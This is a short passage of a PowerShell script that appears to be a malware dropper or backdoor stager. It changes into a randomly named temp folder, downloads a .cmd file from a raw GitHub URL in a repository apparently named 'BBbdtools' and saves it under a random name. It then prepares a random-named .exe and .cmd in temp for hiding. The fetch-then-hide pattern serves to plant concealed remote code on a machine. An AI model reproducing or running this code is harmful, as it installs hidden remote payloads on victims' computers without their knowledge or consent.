...
#change directory
cd $env:temp\NngzPLogJoduDKeSWBMivqvXbnyNnB

#download backup
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/3.cmd" -OutFile FMuJ8g8xKBm7ZTiG.cmd

#hide files
$file = "$env:temp\sVBXKuzqQdnAeJcsBXMnTVKZUniFmN\B6pXddj9cbV7X.exe"
$file2 = "$env:temp\sVBXKuzqQdnAeJcsBXMnTVKZUniFmN\uesFNz8Ds9KS.cmd"
$file3 = "$env:temp\NngzPLogJoduDKeSWBMivqvXbnyNnB\FMuJ8g8xKBm7ZTiG.cmd"
